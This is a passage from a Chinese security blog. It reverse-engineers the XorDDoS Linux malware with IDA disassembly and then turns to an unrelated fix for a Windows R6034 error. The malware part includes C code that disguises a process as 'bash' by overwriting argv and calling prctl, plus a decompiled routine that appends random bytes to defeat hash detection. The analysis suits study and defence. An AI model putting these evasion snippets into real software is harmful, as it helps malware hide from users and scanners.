[ebp+var_4], esi</span><br><span class="line">.text:08048529                 mov     esi, [ebp+file]</span><br><span class="line">.text:0804852C                 mov     [ebp+var_8], ebx</span><br><span class="line">.text:0804852F                 mov     [ebp+argv], 0</span><br><span class="line">.text:08048536                 mov     [ebp+var_14], 0</span><br><span class="line">.text:0804853D                 mov     [ebp+var_10], 0</span><br><span class="line">.text:08048544                 mov     [ebp+var_C], 0</span><br><span class="line">.text:0804854B                 call    doublefork</span><br><span class="line">.text:08048550                 test    eax, eax</span><br><span class="line">.text:08048552                 jz      short ZERO</span><br><span class="line">.text:08048554                 mov     ebx, [ebp+var_8]</span><br><span class="line">.text:08048557                 mov     esi, [ebp+var_4]</span><br><span class="line">.text:0804855A                 mov     esp, ebp</span><br><span class="line">.text:0804855C                 pop     ebp</span><br><span class="line">.text:0804855D                 retn</span><br><span class="line">.text:0804855E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804855E</span><br><span class="line">.text:0804855E ZERO:                                   ; CODE XREF: LinuxExec_Argv2+32j</span><br><span class="line">.text:0804855E                 mov     ebx, 3</span><br><span class="line">.text:08048563</span><br><span class="line">.text:08048563 LOOP:                                   ; CODE XREF: LinuxExec_Argv2+54j</span><br><span class="line">.text:08048563                 mov     [esp], ebx      ; fd</span><br><span class="line">.text:08048566                 add     ebx, 1</span><br><span class="line">.text:08048569                 call    close</span><br><span class="line">.text:0804856E                 cmp     ebx, 400h       ；400h == 1024</span><br><span class="line">.text:08048574                 jnz     short LOOP</span><br><span class="line">.text:08048576                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line">.text:0804857C                 mov     [esp], esi      ; file</span><br><span class="line">.text:0804857F                 mov     [ebp+var_14], eax</span><br><span class="line">.text:08048582                 mov     eax, [ebp+arg_8]；eax = pid</span><br><span class="line">.text:08048585                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048588                 lea     eax, [ebp+argv]</span><br><span class="line">.text:0804858B                 mov     [esp+4], eax    ; argv</span><br><span class="line">.text:0804858F                 call    execvp</span><br><span class="line">.text:08048594                 mov     dword ptr [esp], 0 ; status</span><br><span class="line">.text:0804859B                 call    exit</span><br><span class="line">.text:0804859B LinuxExec_Argv2 endp</span><br></pre></td></tr></table></figure>
-
-<p>LinuxExec_Argv2 有三个参数。最终执行了execvp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0804857C                 mov     [esp], esi      ; file </span><br><span class="line">...</span><br><span class="line">.text:0804858B                 mov     [esp+4], eax    ; argv</span><br><span class="line">.text:0804858F                 call    execvp</span><br></pre></td></tr></table></figure>
-
-<p>伪代码为，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(file, &amp;argv);</span><br></pre></td></tr></table></figure>
-
-<p>file 就是arg_0, 需要分析argv， 调出栈图就比较清晰了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            dd ?                    ; offset</span><br><span class="line">-00000014 var_14          dd ?</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>首先是这句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:08048529                 mov     esi, [ebp+file]</span><br><span class="line">...</span><br><span class="line">.text:0804852F                 mov     [ebp+argv], 0</span><br><span class="line">...</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>执行了这几句代码后，栈图发生了变化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                       ; offset</span><br><span class="line">-00000014 var_14          dd ?</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br></pre></td></tr></table></figure>
-
-
-<p>再看这几句代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048576                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line">...</span><br><span class="line">.text:0804857F                 mov     [ebp+var_14], eax</span><br></pre></td></tr></table></figure>
-
-<p>执行了这几句代码后，栈图发生了变化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                   ; offset</span><br><span class="line">-00000014 var_14          arg_4</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br></pre></td></tr></table></figure>
-
-<p>接下来是这几句代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048582                 mov     eax, [ebp+arg_8]；eax = pid</span><br><span class="line">.text:08048585                 mov     [ebp+var_10], eax</span><br></pre></td></tr></table></figure>
-
-<p>执行了这几句代码后，栈图发生了变化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                   ; offset</span><br><span class="line">-00000014 var_14          arg_4</span><br><span class="line">-00000010 var_10          arg_8</span><br><span class="line">-0000000C var_C           0</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
-
-<p>main函数中对LinuxExec_Argv2 的调用的为代码为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinuxExec_Argv2(&#x27;木马路径&#x27;, &#x27;伪装命令行&#x27;, pid);</span><br></pre></td></tr></table></figure>
-
-<p>因此最后调用的execvp的伪代码为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(&#x27;木马路径&#x27;, argv);</span><br></pre></td></tr></table></figure>
-
-<p>将进入 main 函数参数个数为3的流程，用IDA重命名后，关键代码为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">text:0804B5D3 PARAM_NUM_3:                            ; CODE XREF: main+3CDj</span><br><span class="line"></span><br><span class="line">.text:0804B5D3                 lea     eax, [ebp+var_18]</span><br><span class="line">.text:0804B5D6                 mov     [esp+4], eax</span><br><span class="line">.text:0804B5DA                 lea     eax, [ebp+self_path]</span><br><span class="line">.text:0804B5E0                 mov     [esp], eax</span><br><span class="line">.text:0804B5E3                 call    readfile</span><br><span class="line">.text:0804B5E8                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B5EE                 mov     ebx, [edx+4]</span><br><span class="line">.text:0804B5F1                 mov     [ebp+self_file_content], eax</span><br><span class="line">.text:0804B5F7                 mov     [esp], ebx</span><br><span class="line">.text:0804B5FA                 call    strlen</span><br><span class="line">.text:0804B5FF                 mov     [esp+4], ebx</span><br><span class="line">.text:0804B603                 mov     [esp+8], eax</span><br><span class="line">.text:0804B607                 lea     eax, [ebp+fake_cmd]</span><br><span class="line">.text:0804B60D                 mov     [esp], eax</span><br><span class="line">.text:0804B610                 call    memmove</span><br><span class="line">.text:0804B615                 mov     dword ptr [esp+0Ch], 0</span><br><span class="line">.text:0804B61D                 mov     dword ptr [esp+8], 0Ah</span><br><span class="line">.text:0804B625                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B62D                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B633                 mov     eax, [edx+8]</span><br><span class="line">.text:0804B636                 mov     [esp], eax</span><br><span class="line">.text:0804B639                 call    __strtol_internal</span><br><span class="line">.text:0804B63E                 mov     esi, eax</span><br><span class="line">.text:0804B640                 mov     eax, [ebp+argv_arr]</span><br><span class="line">.text:0804B646                 mov     ebx, [eax]</span><br><span class="line">.text:0804B648                 mov     [esp], ebx</span><br><span class="line">.text:0804B64B                 call    strlen</span><br><span class="line">.text:0804B650                 mov     [esp], ebx</span><br><span class="line">.text:0804B653                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B65B                 mov     [esp+8], eax</span><br><span class="line">.text:0804B65F                 call    memset</span><br><span class="line">.text:0804B664                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B66A                 mov     ebx, [edx+4]</span><br><span class="line">.text:0804B66D                 mov     [esp], ebx</span><br><span class="line">.text:0804B670                 call    strlen</span><br><span class="line">.text:0804B675                 mov     [esp], ebx</span><br><span class="line">.text:0804B678                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B680                 mov     [esp+8], eax</span><br><span class="line">.text:0804B684                 call    memset</span><br><span class="line">.text:0804B689                 mov     eax, [ebp+argv_arr]</span><br><span class="line">.text:0804B68F                 mov     ebx, [eax+8]</span><br><span class="line">.text:0804B692                 mov     [esp], ebx</span><br><span class="line">.text:0804B695                 call    strlen</span><br><span class="line">.text:0804B69A                 mov     [esp], ebx</span><br><span class="line">.text:0804B69D                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B6A5                 mov     [esp+8], eax</span><br><span class="line">.text:0804B6A9                 call    memset</span><br><span class="line">.text:0804B6AE                 lea     edx, [ebp+fake_cmd]</span><br><span class="line">.text:0804B6B4                 mov     [esp+4], edx</span><br><span class="line">.text:0804B6B8                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B6BE                 mov     eax, [edx]</span><br><span class="line">.text:0804B6C0                 mov     [esp], eax</span><br><span class="line">.text:0804B6C3                 call    strcpy</span><br><span class="line">.text:0804B6C8                 lea     eax, [ebp+filename]</span><br><span class="line">.text:0804B6CE                 mov     [esp+0Ch], esi</span><br><span class="line">.text:0804B6D2                 lea     esi, [ebp+randstr_10]</span><br></pre></td></tr></table></figure>
-
-<p>上面代码的原理大致等同于下面这段代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> fake_cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_cmd, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="type">char</span> * argv_arr_1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> argv_arr_1_length = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);</span><br><span class="line">    <span class="type">long</span> pid_long = strtol(argv[<span class="number">2</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="type">char</span> * v29 = (<span class="type">char</span> *)*argv;</span><br><span class="line">    <span class="type">int</span> v30 = <span class="built_in">strlen</span>(*argv);</span><br><span class="line">    <span class="built_in">memset</span>(v29, <span class="number">0</span>, v30);</span><br><span class="line">    <span class="type">char</span> * v31 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> v32 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, v32);</span><br><span class="line">    <span class="type">char</span> * v33 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> v34 = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v33, <span class="number">0</span>, v34);</span><br><span class="line">    <span class="built_in">strcpy</span>(*argv, fake_cmd);</span><br><span class="line">    sleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>编译后执行可以看到效果和运行样本的一样。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -o fakeexe exe.c</span><br><span class="line">➜  ~ ./fakeexe <span class="string">&quot;ls -al&quot;</span> 2554</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /proc/2605/cmdline</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">ls</span> -l /proc/2605/exe</span><br><span class="line">lrwxrwxrwx. 1 henices henices 0 8月   2 12:01 /proc/2605/exe -&gt; /home/henices/research/xorddos/fakeexe</span><br><span class="line"></span><br><span class="line">➜  ~ ps -elf | grep <span class="string">&quot;ls -al&quot;</span> | grep -v grep</span><br><span class="line">0 S henices   2605 25307  0  80   0 -  1043 hrtime 12:01 pts/5    00:00:00 <span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure>
-
-<p>其实效果并不好，可以轻易发现踪迹。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep fakeexe</span><br><span class="line"> 2605 pts/9    00:00:00 fakeexe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>其实有更好的做法，使用 prctl ，至少可以把ps给搞定。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> fake_cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_cmd, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="type">char</span> * argv_arr_1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> argv_arr_1_length = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);</span><br><span class="line">    <span class="type">long</span> pid_long = strtol(argv[<span class="number">2</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="type">char</span> * v29 = (<span class="type">char</span> *)*argv;</span><br><span class="line">    <span class="type">int</span> v30 = <span class="built_in">strlen</span>(*argv);</span><br><span class="line">    <span class="built_in">memset</span>(v29, <span class="number">0</span>, v30);</span><br><span class="line">    <span class="type">char</span> * v31 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> v32 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, v32);</span><br><span class="line">    <span class="type">char</span> * v33 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> v34 = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v33, <span class="number">0</span>, v34);</span><br><span class="line">    <span class="built_in">strcpy</span>(*argv, fake_cmd);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;bash&quot;</span>);</span><br><span class="line">    sleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>编译执行后可以看到效果。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep bash</span><br><span class="line"> 4858 pts/5    00:00:00 bash</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /proc/4858/cmdline </span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"></span><br><span class="line">➜  ~ lsof -d txt | grep fakeexe</span><br><span class="line">bash       4858 henices txt       REG  253,2      8816  4588423 /home/henices/research/xorddos/fakeexe</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="xorddos-的多态-（Polymorphic）"><a href="#xorddos-的多态-（Polymorphic）" class="headerlink" title="xorddos 的多态 （Polymorphic）"></a>xorddos 的多态 （Polymorphic）</h2><p>xorddos这个样本还值得一提的是，这个样本会不断变化，多态这个词翻译的可能不太准确，<br>可以参见上面的英文，自行理解。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">randmd5</span><span class="params">(<span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="type">int</span> fd_dup; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="type">mode_t</span> v4; <span class="comment">// [sp+8h] [bp-20h]@0</span></span><br><span class="line">  <span class="type">int</span> addr; <span class="comment">// [sp+15h] [bp-13h]@1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+19h] [bp-Fh]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// [sp+1Dh] [bp-Bh]@1</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [sp+1Fh] [bp-9h]@1</span></span><br><span class="line"></span><br><span class="line">  addr = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  fd = open(filename, <span class="number">1</span>, v4);</span><br><span class="line">  fd_dup = fd;</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    randstr((<span class="type">int</span>)&amp;addr, <span class="number">10</span>);</span><br><span class="line">    write(fd_dup, &amp;addr, <span class="number">11u</span>);</span><br><span class="line">    close(fd_dup);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>xorddos 样本多态主要就是用这个函数，每次在文件末尾写上10个字节的随机字符。<br>这样样本md5和大小都会发生变化，使得一些检测方法失效。</p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>正因为这种隐藏方法并不理想，后面xorddos出现了带rootkit的版本，进化了。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/Windows_Rx034/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/Windows_Rx034/" class="post-title-link" itemprop="url">解决 Windows Rx034</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/r5051.png" alt="error"></p>
-<p>先放狗搜一下，微软的对R6034的解释如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">An application has made an attempt to load the C runtime library without using</span><br><span class="line">a manifest. This is an unsupported way to load Visual C++ DLLs. You need to</span><br><span class="line">modify your application to build with a manifest. For more information, see the</span><br><span class="line">&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot; topic in the product</span><br><span class="line">documentation.</span><br></pre></td></tr></table></figure>
-
-<p>微软的链接中也提到了解决的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rebuild your application to include a manifest. Building an application with</span><br><span class="line">Visual Studio automatically puts the manifest into the resulting .exe or .dll</span><br><span class="line">file. If you are building at the command line, use the mt.exe tool to add the</span><br><span class="line">manifest as a resource. Use resource ID 1 if you build an .exe, and resource</span><br><span class="line">ID 2 if you build a .dll. For more information, see How to: Embed a Manifest</span><br><span class="line">Inside a C/C++ Application.</span><br></pre></td></tr></table></figure>
-
-<p>大概的意思是需要使用manifest.xml来指定需要加载的DLL。上网又翻看了几个链接发现这个错误的成因比较复杂，主要原因是加载mscvr*.dll 出现了问题。不管怎样还是先看看是否使用了 manifest。从微软的解决办法可以知道，manifest很有可能在资源文件里。</p>
-<p>还是先看看manifest的作用，在msdn网站搜索相关内容，根据《Understanding Manifest Generation for C&#x2F;C++ Programs》中的内容，manfest.xml可以是一个外部的XML文件也可以是嵌入在程序的资源文件中。manifest.xml用于管理程序在运行时需要的共享程序集的名字和版本。如果程序只依赖 VisualC++ 的程序集（CRT，MFC，ATL等），manifest会被链接器自动生成。Manifest的Sxs指定了其依赖的清单名称,版本,资源,和其他组件。Sxs是Windows XP引入的新技术，vs 2005 开始使用，全名叫Side by Side assembly，主要还是为了解决兼容性问题，这样同一个系统可以存在不同版本的同名文件而互相不影响各自的运行。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/sxs.png" alt="sxs"></p>
-<p>现在需要定位gvim.exe加载哪个DLL引起了R6034错误，使用Process Explorer发现是加载ycm_client_support.pyd导致。删除YouCompleteMe插件后错误消失。</p>
-<p>先看看ycm_client_support.pyd是否使用了manifest.xml, 使用神器TC,  F3一下，可以查看manifest的情况。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/manifest.png" alt="manifest.xml"></p>
